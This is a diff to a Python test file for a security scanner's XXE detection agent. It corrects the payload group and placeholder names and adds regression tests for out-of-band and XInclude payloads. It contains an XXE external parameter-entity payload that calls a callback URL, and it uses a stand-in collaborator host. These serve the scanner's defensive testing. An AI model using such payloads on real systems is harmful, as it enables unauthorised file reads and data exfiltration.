@@ -89,10 +89,12 @@ async def test_oob_exfiltration_confirmed(monkeypatch):
     # until the function executes. The 3s OOB-wait sleep is the only one hit
     # in this path, so this keeps the test fast without touching timing logic.
     monkeypatch.setattr("asyncio.sleep", AsyncMock(return_value=None))
+    # Group name and placeholder must match dast/payloads/xxe.yaml: the OOB
+    # group is "oob_dtd" and the collaborator placeholder is bare CALLBACK_URL.
     monkeypatch.setattr(
         "dast.agents.xxe_agent.get_payloads",
         lambda category, group: (
-            ['<!DOCTYPE x [<!ENTITY % xxe SYSTEM "{{CALLBACK_URL}}">]>'] if group == "oob_exfiltration" else []
+            ['<!DOCTYPE x [<!ENTITY % xxe SYSTEM "CALLBACK_URL/xxe.dtd"> %xxe;]>'] if group == "oob_dtd" else []
         ),
     )
 
@@ -105,6 +107,52 @@ async def test_oob_exfiltration_confirmed(monkeypatch):
     assert len(findings) == 1
     assert "Out-of-Band Exfiltration" in findings[0].title
     assert findings[0].confirmed is True
+
+
+# ── regression: real payloads load and the collaborator URL is substituted ───
+# Guards against the group-name / placeholder mismatch that silently disabled
+# OOB XXE (agent asked for "oob_exfiltration"/"{{CALLBACK_URL}}" while the YAML
+# defines "oob_dtd"/"CALLBACK_URL", so no OOB payload was ever sent).
+
+@pytest.mark.asyncio
+async def test_oob_real_payloads_substitute_callback_url(monkeypatch):
+    target = _target()
+    collaborator = _FakeCollaborator(url="http://collab.example/abc123", hit=False)
+    monkeypatch.setattr("asyncio.sleep", AsyncMock(return_value=None))
+
+    sent_bodies = []
+
+    async def fake_send(client, method, url, headers, body, payload=None):
+        sent_bodies.append(body or "")
+        return _resp(200, "<root>ok</root>")
+
+    with patch("dast.agents.xxe_agent._send", side_effect=fake_send):
+        await XxeAgent().run(target, MagicMock(), collaborator=collaborator)
+
+    # At least one OOB payload from the real xxe.yaml must have been sent with
+    # the placeholder replaced by the collaborator URL — and none may still
+    # carry the raw CALLBACK_URL token.
+    assert any(collaborator.url in body for body in sent_bodies)
+    assert not any("CALLBACK_URL" in body for body in sent_bodies)
+
+
+# ── regression: inline parameter-entity payloads are exercised ────────────────
+
+@pytest.mark.asyncio
+async def test_parameter_entity_payloads_are_sent():
+    target = _target()
+    sent_bodies = []
+
+    async def fake_send(client, method, url, headers, body, payload=None):
+        sent_bodies.append(body or "")
+        return _resp(200, "<root>ok</root>")
+
+    with patch("dast.agents.xxe_agent._send", side_effect=fake_send):
+        await XxeAgent().run(target, MagicMock(), collaborator=None)
+
+    # The XInclude variant is unique to the parameter_entity group, so seeing it
+    # proves that group is now wired into the inline file-read phase.
+    assert any("xi:include" in body.lower() for body in sent_bodies)
 
 
 # ── negative: clean XML response, no collaborator ────────────────────────────
